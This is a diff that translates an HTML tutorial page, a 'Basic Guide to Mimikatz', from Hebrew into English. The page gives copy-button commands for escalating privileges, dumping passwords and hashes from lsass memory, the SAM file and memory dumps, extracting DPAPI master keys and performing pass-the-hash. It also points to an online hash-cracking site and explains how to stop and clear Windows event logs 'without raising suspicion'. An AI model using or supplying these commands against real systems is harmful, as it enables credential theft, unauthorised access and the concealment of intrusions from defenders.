@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="he" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>מדריך בסיסי ל-Mimikatz</title>
+  <title>Basic Guide to Mimikatz</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -51,76 +51,75 @@
 </head>
 <body>
 
-<h1>מדריך בסיסי לעבודה עם Mimikatz</h1>
+<h1>Basic Guide to Mimikatz</h1>
 
-<h2>פתיחה והרצה</h2>
-<p>תמיד לפתוח את ה-CMD <strong>כמנהל מערכת</strong> (Run as administrator)! אם לא, Mimikatz לא יוכל לרוץ ולא יצליח לעלות להרשאות גבוהות כמו NT SYSTEM.</p>
+<h2>Opening and Running</h2>
+<p>To get started, open CMD <strong>as an Administrator</strong> (Run as administrator). If you don't do this, Mimikatz will not be able to function and gain high-level privileges like NT SYSTEM.</p>
 
-<h2>בדיקת הרשאות</h2>
-<p>לבדוק אם יש הרשאות מתקדמות:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>privilege::debug</pre>
-<p>אם אין הרשאות תקבל שגיאה:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>privilege::debug {ERROR MESSAGE = not admin}</pre>
+<h2>Checking Privileges</h2>
+<p>To check if you have elevated privileges, use the following command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>privilege::debug</pre>
+<p>If you don't have the necessary privileges, you'll get an error message:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>privilege::debug {ERROR MESSAGE = not admin}</pre>
 
-<h2>העלאת הרשאות</h2>
-<p>לעלות להרשאות גבוהות דרך טוקנים פתוחים:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>token::elevate</pre>
+<h2>Elevating Privileges</h2>
+<p>To elevate your privileges, use open tokens:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>token::elevate</pre>
 
-<h2>שמירת פלט לקובץ</h2>
-<p>לשמור את כל הפלט של Mimikatz לקובץ טקסט:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>log C:\fool.txt</pre>
+<h2>Saving Output to a File</h2>
+<p>If you'd like to save all of Mimikatz's output to a text file, use the following command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>log C:\fool.txt</pre>
 
-<h2>שליפת סיסמאות והאשינגים מהזיכרון (RAM)</h2>
-<p>לשלוף סיסמאות והאשינגים מ-process של lsass.exe:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::logonpasswords</pre>
+<h2>Extracting Passwords and Hashes from RAM</h2>
+<p>To extract passwords and hashes from the lsass.exe process, use this command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sekurlsa::logonpasswords</pre>
 
-<h2>שליפת מידע מה-SAM</h2>
-<p>לשלוף יוזרים והאשים מהקובץ המקומי SAM:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>lsadump::sam</pre>
+<h2>Extracting Information from the SAM</h2>
+<p>To extract users and hashes from the local SAM file, use this command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>lsadump::sam</pre>
 
-<h2>עבודה עם קובץ Dump חיצוני</h2>
-<p>לטעון קובץ דמפ חיצוני ואז לעבוד עליו:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::minidump "C:\Users\username\full_dump_file.dmp"</pre>
-<p>ואז להוציא ממנו סיסמאות:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::logonpasswords</pre>
+<h2>Working with External Dump Files</h2>
+<p>To load an external dump file and work on it, use the following command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sekurlsa::minidump "C:\Users\username\full_dump_file.dmp"</pre>
+<p>Then you can extract passwords from it:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sekurlsa::logonpasswords</pre>
 
-<h2>ניקוי לוגים בלי לעורר חשד</h2>
-<p>לעצור את יצירת הלוגים ואז לנקות:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>event::drop</pre>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>event::clear</pre>
+<h2>Clearing Logs Without Raising Suspicion</h2>
+<p>To stop log creation and then clear them, use the following commands:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>event::drop</pre>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>event::clear</pre>
 
-<h2>פיצוח האשים</h2>
-<p>להעלות את ההאש לאתר ולנסות לפצח:</p>
+<h2>Cracking Hashes</h2>
+<p>If you have a hash, you can upload it to the following site and try to crack it:</p>
 <a href="https://crackstation.net" target="_blank">https://crackstation.net</a>
 
-<h2>עבודה עם DPAPI</h2>
-<p>להציג את ה-masterkey שהמערכת שומרת:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>sekurlsa::dpapi</pre>
+<h2>Working with DPAPI</h2>
+<p>To display the master key the system stores, use the following command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sekurlsa::dpapi</pre>
 
 <h2>Pass-the-Hash</h2>
-<p>להשתמש ב-NTLM Hash להתחברות:</p>
-<pre><button class="copy-btn" onclick="copyText(this)">העתק</button>token::elevate
+<p>To use an NTLM hash to authenticate, use this command:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>token::elevate
 sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH</pre>
 
-<h2>סיכום</h2>
-<p>במדריך למדנו:
+<h2>Summary</h2>
+<p>In this guide, we learned the following:</p>
 <ul>
-  <li>איך להפעיל נכון את Mimikatz</li>
-  <li>איך לבדוק ולהרים הרשאות</li>
-  <li>איך לשלוף סיסמאות מה-RAM וה-SAM</li>
-  <li>איך לעבוד עם קבצי דמפ חיצוניים</li>
-  <li>איך לנקות לוגים מבלי לעורר התראה</li>
-  <li>איך לפצח האשים ולעבוד עם DPAPI</li>
-  <li>איך לבצע Pass-The-Hash בקלות</li>
+  <li>How to properly run Mimikatz</li>
+  <li>How to check and elevate privileges</li>
+  <li>How to extract passwords and hashes from RAM and SAM</li>
+  <li>How to work with external dump files</li>
+  <li>How to clear logs without raising alerts</li>
+  <li>How to crack hashes and work with DPAPI</li>
+  <li>How to perform Pass-the-Hash attacks</li>
 </ul>
-</p>
 
 <script>
 function copyText(button) {
   const code = button.nextSibling.textContent;
   navigator.clipboard.writeText(code.trim());
-  button.innerText = "הועתק!";
-  setTimeout(() => button.innerText = "העתק", 2000);
+  button.innerText = "Copied!";
+  setTimeout(() => button.innerText = "Copy", 2000);
 }
 </script>
 
